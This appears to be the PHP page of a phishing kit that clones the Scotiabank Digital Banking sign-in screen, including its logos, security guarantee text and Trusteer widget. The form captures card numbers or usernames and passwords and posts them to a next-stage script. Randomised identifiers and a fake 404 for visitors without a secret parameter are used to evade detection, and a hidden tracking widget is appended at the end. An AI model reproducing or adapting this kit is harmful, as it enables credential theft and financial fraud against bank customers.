﻿<?php
session_start();
error_reporting(0);
include "../control.php";
include "../sc.php";

if(isset($_GET["intcp"]))
{
	$fname=randomCha(rand(10,15));
	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
		
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta http-equiv="content-language" content="en">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		
		<title>		
		Sign in to Scotiabank Digital Banking Services
		</title>
		
		<meta http-equiv="Cache-Control" content="no-cache">
		<meta http-equiv="pragma" content="no-cache">
		<meta http-equiv="expires" content="0"> 
		<meta http-equiv="Content-Style-Type" content="text/css">
		<meta http-equiv="Content-Script-Type" content="text/javascript">
		
		<link rel="shortcut icon" href="favicon.ico">

		
		
		<link rel="stylesheet" type="text/css" media="all" href="measure/load.css?load_id='.randomCha(rand(15,16)).'">
		<link rel="stylesheet" type="text/css" media="all" href="measure/jquery.css?load_id='.randomCha(rand(15,16)).'">
		<link rel="stylesheet" type="text/css" media="screen" href="measure/load2.css?load_id='.randomCha(rand(15,16)).'">
		<link href="measure/plugin.css?load_id='.randomCha(rand(15,16)).'" rel="stylesheet" type="text/css">
		
		</head>
	
	<body>
	 <div id="helpCentreCurtain" class="helpCurtain" style="display: none"><form id="showContactUsByJSLink" name="showContactUsByJSLink" method="post" action="/online/authentication/authentication.bns" target=""></form><span id="helpCentre_curtainContent_container"><div id="helpCentre_curtainSearch_container" class="search"><form id="helpCentre_curtain_searchForm" name="helpCentre_curtain_searchForm" method="post" action="/online/authentication/authentication.bns" target="">	
			<div class="left-wrapper">
	<fieldset class="">
		<legend>Search form</legend>
					<h3>Help </h3>
					<div class="search-input-wrapper"><label for="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" class="off-screen">
Search for</label><input id="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" type="text" name="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" class="search-input">
						<a class="skip" href="#main-content" >skip to search result</a><input class="primary-button" id="helpCentre_curtain_searchForm:searchSubmit" name="helpCentre_curtain_searchForm:searchSubmit"  value="Search" type="submit">						
					</div>				
					<div class="help-ajax-loading"><span id="_viewRoot:status"><span id="_viewRoot:status.start" style="display: none">
	                    		<img style="float:left;" src="measure/ajax-loader-small.gif"></span><span id="_viewRoot:status.stop"></span></span>																													
					</div>
	</fieldset>			
			</div>
			<div class="right-wrapper">		    
				<div class="send-message-wrapper">
						<a href="#"  >Branch &amp; ABM Locator  </a>
				</div>
				<a href="javascript:void(0)" id="helpcentre_printHelpSection" class="printHelpSection float-left" title="" >
					<img alt="Print Help section" src="measure/icon_print.png">
				</a>				
				<div class="close-link-wrapper"><a class="closeHelp var_helpCentre_closeLink" href="#" id="helpCentre_curtain_searchForm:cmdHideAskCurtain" name="helpCentre_curtain_searchForm:cmdHideAskCurtain" >Close</a>
					<span class="off-screen">Help   </span>																	 		
				</div>			
			</div></form></div>
	
			<div class="help"><form id="helpCentre_curtain_contentForm" name="helpCentre_curtain_contentForm" method="post" action="/online/authentication/authentication.bns" target=""></form>							
			</div>
			</span>
	</div>
		
		
		<div class="page_bg">
		<div class="page-wrapper">
	
		
	<div class="header">
		<div class="scotia-logo">
		<a title="" id="scotia-logo-img-id" styleclass="scotia-logo-image" href="#" >
			
			<div class="scotia-logo-img-div-en" role="img" aria-label="Scotiabank Group"></div>
		</a>
			<span class="scotia-logo-image-bw">
				<img src="measure/scotiabank-group-bw.gif" alt="Scotiabank Group">
			</span>
		</div>
		<a class="skip-nav" href="#main-content" >Skip to main content</a>
		<div class="header-links">
			<ul title=""><span id="helpCentre_curtainMenu_container">				
				<li class="var_main_top-links_tab_1"><form id="helpCentre_curtainMenuControls_helpform" name="helpCentre_curtainMenuControls_helpform" method="post" action="/online/authentication/authentication.bns" target=""><a class="var_helpCentre_helpLink " href="#" id="helpCentre_curtainMenuControls_helpform:j_id46" name="helpCentre_curtainMenuControls_helpform:j_id46" ><span id="helpCentre_curtainMenuControls_helpform:j_id47" class="">Help</span></a></form>					
				</li>
				<li class="var_main_top-links_tab_2"><form id="helpCentre_curtainMenuControls_contactform" name="helpCentre_curtainMenuControls_contactform" method="post" action="/online/authentication/authentication.bns" target=""><a class="var_helpCentre_contactLink " href="#" id="helpCentre_curtainMenuControls_contactform:j_id50" name="helpCentre_curtainMenuControls_contactform:j_id50" ><span id="helpCentre_curtainMenuControls_contactform:j_id51" class="">Contact</span></a></form>		
				</li>
				</span>    
				<li class="var_main_top-links_tab_3">
				<a href="#"  >
				<span>Locate Us</span></a></li>
<form id="lang_switch_form_1" name="lang_switch_form_1" method="post" action="/online/authentication/authentication.bns" enctype="application/x-www-form-urlencoded">

<span id="lang_switch_form_1:sel_en_000">
		<li class="var_main_top-links_tab_6">

<a id="lang_switch_form_1:fr_sel_000" href="#" >Français</a>
		</li></span>
</form>
			</ul>
		</div>
	</div>
	<div class="clearboth"></div>
	
	<div class="navigation pre-sign-on-flow"></div>
				
   	<div class="clearboth"></div>
			
			
			<div class="signon-wrapper">
			<div class="content">
	
		
		<div class="dataview">
			<a name="main-content"></a>
		<h1>Sign In</h1>				
				<div class="signon-form-block">
				
				';
				if(isset($_GET["errOccured"]))
				{
					echo '
				
				<span id="span_msgs_5"><div class="ewa-bucket" tabindex="0">
			<h4 class="off-screen">Error Messages</h4>
			<ul class="error">
					<li>
						<span>Either your card number or your password has been entered incorrectly. Please try again. (Error #SC1-1)
						</span>
					</li>
			</ul></div></span>
			';
				}
				echo '
			
				<span id="signon_a4j_panel">
		<div id="RN:" data-m-priority="-1" data-m-campaignid="" data-m-pageid="login" data-m-containerid="logininfotop">
		</div><span id="span_msgs_1"></span>

		
		
			
			<div class="signon-element-container">
			
				
				<div class="form-section">
				
					<div class="signon-form-container">
					
						<div class="signon-element-container-left-form">
<form id="'.$fname.'" name="'.$fname.'" method="post" action="nfaAuthntication.bs.php?intcp='.randomCha(rand(2,3)).'|QUESTIONS|F='.randomCha(rand(30,60)).'">
<input name="jID" value="'.randomCha(rand(10,99)).'" type="hidden" />
<div id="signon_form:div1" class="data-pair">
		<div id="RN:CardNumber_Label_Login-en-June2016" data-m-priority="0" data-m-campaignid="" data-m-pageid="login" data-m-containerid="loginandlogout_scotiacard"><label for="signon_form:userNameSaved" style="font-size: 1.06em; text-align: right; padding-bottom: 0; margin-bottom: 0; padding-top: 5px;">Username or<br>
Card number:</label>

		</div><input id="uname" type="text" name="uname" autocomplete="off" class="signon-username autoTab" maxlength="32"><a href="#" id="signon_form:j_id134" name="signon_form:j_id134" ><span id="signon_form:j_id135" class="">
			<img title="" alt="Help with remember my card" src="measure/icon_help.png"></span></a></div>
						
						<div class="data-pair">
		<div id="RN:Password_Label_Login-en-June2016" data-m-priority="0" data-m-campaignid="" data-m-pageid="login" data-m-containerid="loginandlogout_password"><label for="signon_form:password_0" style="font-size: 1.06em; text-align: right; padding-bottom: 0; margin-bottom: 0; padding-top: 5px;">Password:</label>

		</div><input id="pword" type="password" name="pword" autocomplete="off" value="" maxlength="32" class="signon-password">
							<span class="float-left padding-left-180">
							<a href="#" >
								Need help signing in?
							</a>
							</span>
							<div class="clearboth"></div>
						</div><div id="signon_form:div3" class="data-pair padding-left-180"><input id="signon_form:saveCard" type="checkbox" name="signon_form:saveCard" value="true" class="signon-remember-my-card-checkbox" ><label for="signon_form:saveCard">

									<span>Remember me</span>
									<br>
									<span class="remember-card-info">(Not advised for public computers)</span></label><a href="#" id="signon_form:j_id159" name="signon_form:j_id159" ><span id="signon_form:j_id160" class="">
			<img title="" alt="Help with remember my card" src="measure/icon_help.png"></span></a></div><div id="signon_form:j_id162" class="clearboth"></div>
							<div id="nickname-card" class="data-pair hide" style="display: none;">
		<div id="RN:CardNickname_Label_Login-en-June2016" data-m-priority="0" data-m-campaignid="" data-m-pageid="login" data-m-containerid="loginandlogout_nicknamemycard"><label for="signon_form:userNameSaved" style="font-size: 1.06em; text-align: right; padding-bottom: 0; margin-bottom: 0; padding-top: 5px;">Nickname my card
(optional):</label>

		</div><input id="signon_form:card-nickname" type="text" name="signon_form:card-nickname" autocomplete="off" maxlength="7">
                           		 <div class="clearboth"></div>
                            </div>
						<div class="signon-primary-action padding-left-180"><input id="signon_form:enter_sol" type="submit" name="signon_form:enter_sol" value="Sign In" class="primary-button">
						</div>
						<div class="clearboth"></div>
</form>	
						</div> 
					
					</div> 

				</div> 
							<div class="signon-element-container-right-form">
				 	<div class="signon-rightRail-container">

	

	<div class="signon-rightRail-header">
		<h3>Activate Online &amp; Mobile Banking</h3>
	</div>
	<div class="signon-rightRail-content padding-top-20">
		<div id="RN:Activate_Login_EN" data-m-priority="0" data-m-campaignid="" data-m-pageid="login" data-m-containerid="loginactivateflow"><form><input class="secondary-button signin-button float-left"  type="button" value="Activate Now"><br>
</form>

<br>

<br>

<ul>
<li><a href="#"  >What
you need to activate</a></li>
<li><a href="#"  >Save time with Digital Banking</a></li>
</ul>


		</div>
	</div>
					</div>
				</div>
				
				
		
			</div></span>
	
	
	
	
				</div>
				<div class="tap-container">
	
		
	<ul id="taps" class="tap-links">
         <li id="security-guarantee" class="active">Online Security Guarantee</li>
         <li id="security-centre">Security Centre</li>

     </ul>
        
	<div class="clearboth"></div>
	
	<div class="signon-security-content" id="tap-content-container">
		
		 <div id="security-guarantee" class="show">
                 <div class="tapContent-double-column signon-lock">
                     <span class="grey-text">
                     	We will fully reimburse you in the unlikely event 
that you suffer direct financial losses due to unauthorized activity
                     	<span class="legal-notifier"><a href="#"  >1</a></span> 
                     	in your accounts through Digital Banking Services 
                     	<span class="legal-notifier"><a href="#"  >2</a></span> 
                     	provided you have met your security responsibilities.
                     </span>
                 </div>
                   <div class="tapContent-single-column signon-trustee trusteerStatus">
		<div id="RN:TrusteerWidget_Login_EN_Jan15" data-m-priority="0" data-m-campaignid="" data-m-pageid="login" data-m-containerid="logintrusteerstatus"><div class="trusteerNotRunning"><span class="grey-text"><strong>Trusteer Status</strong></span> 
<p>You don\'t have Trusteer</p>
<a href="#"  >Learn more</a><br>
</div>

<div class="trusteerRunning" style="display: none;"><span class="grey-text"><strong>Trusteer Status</strong><img class="margin-left-10" src="measure/icon_success.png"></span> 
<p>Your Scotia OnLine session is secure with Trusteer Rapport</p>
</div>


		</div>
                 </div>
             </div>
              
              
              
              <div id="security-centre" class="hide">
		<div id="RN:SecurityCentre_Login_EN-June2016" data-m-priority="0" data-m-campaignid="" data-m-pageid="login" data-m-containerid="loginsecuritycentre"><div class="tapContent-left-single-column">
<ul>
<li><span lang="EN"><a href="#"  >Visit our Security Centre</a></span></li>
<li><span lang="EN"><a href="#"  >View our Security Video</a></span></li>
<li><span lang="EN"><a href="#"  >Report Online Fraud</a></span></li>
</ul>
</div>

<div class="tapContent-single-column">
<ul>
<li><span lang="EN"><a href="#"  >Identity Theft</a></span></li>
<li><span lang="EN"><a href="#"  >Free Anti-Virus Protection</a></span></li>
</ul>
</div>

<p>&nbsp;</p>


		</div>
              		<div class="tapContent-single-column signon-trustee trusteerStatus">
		<div id="RN:TrusteerWidget_Login_EN_Jan15" data-m-priority="0" data-m-campaignid="" data-m-pageid="login" data-m-containerid="logintrusteerstatus"><div class="trusteerNotRunning"><span class="grey-text"><strong>Trusteer Status</strong></span> 
<p>You don\'t have Trusteer</p>
<a href="#"  >Learn more</a><br>
</div>

<div class="trusteerRunning" style="display: none;"><span class="grey-text"><strong>Trusteer Status</strong><img class="margin-left-10" src="measure/icon_success.png"></span> 
<p>Your Scotia OnLine session is secure with Trusteer Rapport</p>
</div>


		</div>
                 	</div>
              </div>
              <div class="clearboth"></div>
	</div>
				</div>
				  <div class="clearboth"></div>
				  <div id="banner" style="margin-top: -18px;">	
	
	<div class="signon-footer-cms-block-half left">	
		<div id="login_loginmktgleft">
		<div id="RN:TravelInsurance_LoginL-EN-Nov18" data-m-priority="0" data-m-campaignid="" data-m-pageid="login" data-m-containerid="loginmktgleft"><a href="#"  ><img src="measure/ad-travel_insurance-loginleft-en.png" alt="Travel Insurance"></a>

		</div>
		</div>
	</div>		
		
	
		
	<div class="signon-footer-cms-block-half right">
		<div id="login_loginmktgright">
		<div id="RN:D2D_VisaDebit_NHL_Mass-LoginR-EN-Nov18" data-m-priority="0" data-m-campaignid="" data-m-pageid="login" data-m-containerid="loginmktgright"><a href="#"  ><img src="measure/login_banner.jpg" alt="Score chances to go to the 2019 Honda NHL All-Star Game. Pay online or abroad with your Visa Debit card for chances to win.* Learn More. *No purchase necessary. Conditions apply."></a>

		</div>
		</div>
	</div>
				</div>
			
		</div>									
			</div>
			<div class="clearboth"></div>
	
	<div class="footer-centered">

		<div id="pageId" class="pageID">
		
		Sign on to Scotia OnLine:'.randomCha(rand(1,2)).rand(100,999).randomCha(rand(1,2)).rand(100,999).'<div id="j_id239">			
			</div>
		</div>
		<div class="footer">
			<div class="footer-links resp-hide">			
				<ul>
					<li><a  class="rewardsItem" href="javascript:void(0)">Legal</a></li> 
					
					
					<li><a  class="rewardsItem" href="javascript:void(0)">Privacy</a></li>
					<li><a  class="rewardsItem" href="javascript:void(0)">Security</a></li>
					<li><a href="#" class="rewardsItem" >Mobile Site</a></li> 
						<li><a  class="rewardsItem" href="javascript:void(0)">Scotiabank.com</a></li>
				</ul>		
			</div>
			<div class="clearboth"></div>		
		</div><div id="j_id254">
			</div><div id="analyticsEventAjax_div"></div><div id="analyticsEventAjaxLinkLevel_div"></div>	
		
		
		
	
		
		
		
	</div>					
			</div>					
		</div>
		</div>
	
</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 - Page Not Found', true, 404);
	die("<h1>404 - Page Not Found</h1>");
}
?>
</script> <div style="display:none;"> <script id="_wau914">var _wau = _wau || []; _wau.push(["small", "qputrzx6ar", "914"]); (function() {var s=document.createElement("script"); s.async=true; s.src="https://widgets.amung.us/small.js"; document.getElementsByTagName("head")[0].appendChild(s); })();</script>